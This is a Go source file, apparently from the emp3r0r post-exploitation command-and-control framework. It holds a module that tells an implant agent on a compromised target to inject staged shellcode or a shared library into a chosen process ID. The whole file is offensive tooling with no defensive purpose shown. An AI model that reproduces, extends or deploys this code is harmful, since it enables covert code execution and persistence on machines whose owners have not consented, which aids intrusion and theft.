package cc

import (
	"fmt"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func moduleInjector() {
	// target
	target := CurrentTarget
	if target == nil {
		CliPrintError("Target not exist")
		return
	}
	method := Options["method"].Val

	shellcode_file := "shellcode.txt"
	so_file := "to_inject.so"

	// shellcode.txt
	pid := Options["pid"].Val
	if method == "inject_shellcode" && !util.IsExist(WWWRoot+shellcode_file) {
		CliPrintError("%s%s does not exist", WWWRoot, shellcode_file)
		return
	}

	// to_inject.so
	if method == "shared_library" && !util.IsExist(WWWRoot+so_file) {
		CliPrintError("%s%s does not exist", WWWRoot, so_file)
		return
	}

	// injector cmd
	cmd := fmt.Sprintf("%s %s %s", emp3r0r_data.C2CmdInject, method, pid)

	// tell agent to inject
	err = SendCmd(cmd, "", target)
	if err != nil {
		CliPrintError("Could not send command (%s) to agent: %v", cmd, err)
		return
	}
	CliMsg("Please wait...")
}
